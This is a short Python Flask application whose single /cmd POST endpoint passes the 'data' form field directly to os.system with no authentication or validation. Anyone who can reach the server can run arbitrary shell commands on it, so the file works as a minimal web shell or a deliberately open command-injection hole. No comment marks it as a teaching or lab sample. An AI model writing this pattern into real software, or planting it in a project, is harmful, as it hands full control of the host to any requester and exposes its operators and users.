import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.form.get('data')
    os.system(data)

if __name__ == '__main__':
    app.run()
